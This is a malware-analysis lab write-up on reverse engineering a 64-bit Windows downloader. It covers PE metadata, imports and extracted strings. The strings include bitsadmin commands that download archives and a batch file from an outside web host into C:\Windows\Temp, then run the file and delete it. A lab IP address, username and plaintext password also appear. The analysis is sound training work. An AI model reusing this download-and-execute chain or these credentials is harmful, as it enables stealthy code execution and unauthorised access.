# Lab 12 - Reverse Engineering a 64-bit Downloader using IDA Pro

---

## Scenario

You have been called by a client to examine a weird sample that was found on one of their developerâ€™s systems. The client thinks this sample could be hiding its true nature of activity.

<br/>

The goal of this lab is to understand how to both debug and reverse engineer a downloader which is widely used by different threat actors.

<br/>

After completing this lab, you will be able to use a disassembler such as IDA Pro to reverse engineer a downloader. You will also use a debugger such as x64dbg to debug the same downloader and understand what malicious activity is being carried by this downloader.

<br/>

192.168.210.10 / AdminELS / Nu3pmkfyX

<br/>

---

## Tools

- x64dbg (or any other 64-bit debugger) 
- IDA Pro (we are using the free version) 
- pestudio (9.0.2) or any other PE Analyzer

<br/>

---

## Task 1: General Sample Info

**Question**

Use a PE file analyzer to extract as much information you can to help you with the reverse engineering process.

<br/>

**Answer**

Open **Downloader.exe** in **PEStudio**:

![picture 369](images/dd32dd2ae2ac9dd1696b15cbe69e9c2e54442c0adcd6d0f14dc64930ee23c0cc.png)  

- MD5: 0F57C9201984E46D8AEFE1113828D645
- SHA1: EA26217E97B1024311E3359C85EDDBEDDC603682
- SHA256: F1E6E24655960818A1CBAFF3641AC5CB22FF26ED0EB86986B68CEB10C1F611A4
- PE file (`MZ` / `0x4d5a`)
- 64-bit
- Console application

<br/>

Navigate to **Libraries**:

![picture 370](images/5389c234ca76a54c2bdfe27c15740e5d0626b7689f411222d085797993208ad7.png)  

- urlmon.dll - network connectivity (`URLDownloadToFileA`)
- kernel32.dll
- shell32.dll

<br/>

Check **imports**:

![picture 371](images/6b0e5fad68ac6e0e9381f1ef9ad4c4ead38d7105adbc6ae10f95ff6934ff7d66.png)  

- URLDownloadToFileA
- ShellExecuteA

<br/>

Check **manifest**:

![picture 372](images/f840587975b16c5555c9ee09b45f687f5de5698e92aa31ed4dc511a526b04c5a.png)  

- The program requires Administrator privilege

<br/>

Check **Strings**:

![picture 373](images/0abea42d36b9fb52a6276a82c5cda3600de7636c0b6fb51c2ff5626ef39cc8f0.png)  

- (0x1420) `/C bitsadmin.exe /transfer IND1 /download /priority high https://download.sysinternals.com/files/ShellRunas.zip C:\Windows\Temp\1.zip`
- (0x14A8) `cmd.exe`
- (0x14B8) `c:\Windows\Temp\`
- (0x14D0) `/C tar.exe -xf C:\Windows\Temp\1.zip && del /F c:\Windows\Temp\1.zip`
- (0x1518) `2.zip`
- (0x1520) `https://download.sysinternals.com/files/Autoruns.zip`
- (0x1560) `/C tar.exe -xf C:\Windows\Temp\2.zip && del /F c:\Windows\Temp\2.zip`
- (0x15B0) `/C bitsadmin.exe /transfer IND2 /download /priority high http://www.elsmap.com/file.bat C:\Windows\Temp\file.bat`
- (0x1628) `/C C:\Windows\Temp\file.bat && del /F c:\Windows\Temp\file.bat`

<br/>

---
